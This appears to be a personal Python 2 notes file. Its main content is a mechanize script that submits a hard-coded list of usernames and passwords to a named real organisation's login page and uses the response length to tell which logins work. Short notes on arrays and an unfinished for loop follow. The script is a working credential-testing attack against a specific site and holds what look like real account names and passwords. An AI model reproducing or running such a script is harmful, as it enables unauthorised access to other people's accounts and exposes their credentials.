#trying multpile users login and password in a website
    import mechanize  #pip install mechanize
    arrayusername = ["iita-mistrng","shakushaku","oshozondi"] #array of usernames mapped to the right index of the password
    arraypassword = ["Oluwatosin","victoria","Zennat"] #array of password mapped to the right index of respective username

    website = "http://my.iita.org/login.jspx" #name of the website

    for i in range (len(arrayusername)): #a for loop that queries the site for the number of usernames available
        br = mechanize.Browser()
        br.set_handle_robots(False)
        br.addheaders = [("User-agent","Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.13) Gecko/20101206 Ubuntu/10.10 (maverick) Firefox/3.6.13")]

        sign_in = br.open(website)  #the login url

        br.select_form(nr = 0) #accessing form by their index. Since we have only one form in this example, nr =0.
        #since it should be a login page, it should have only one form, hence index is 0, but if you also know the form name use the step below
        #br.select_form(name = "form name") Alternatively you may use this instead of the above line if your form has name attribute available.

        br["j_username"] = arrayusername[i] #the key "j_username" is the parameter that takes in the username input from the form, inspect the website to see the name of the textbox 

        br["j_password"] = arraypassword[i] #the key "j_password" is the parameter that takes in the password input from the form, inspect the website to see the name of the textbox 

        
        logged_in = br.submit()   #submitting the login credentials

        logincheck = logged_in.read()  #reading the page body that is redirected after successful login

        print logincheck #this will print out either an error page or the next redirected page for a succesful login

        #find the length of the error page
        #len(logincheck)   lets assume it equals 2082

        # if (len(logincheck) == 2082):
        #     print 'Invalid username/password for ',arrayusername[i] #printing the body of the redirected url after login
        # else:
        # print 'valid username',arrayusername[i]

#using arrays 
    array = [1,2,'a','b'] #it can take multiple datatypes
    array = [] #declearing an array, the lenght does not need to be specified
    array.append('z') #this adds a new element into the array
    array.insert(1,20) # takes two arguments the index position for insertion and the value to be inserted

#using for loop
    for i in range(200):
        #this runs for 1 - 200, it runs too times 

#

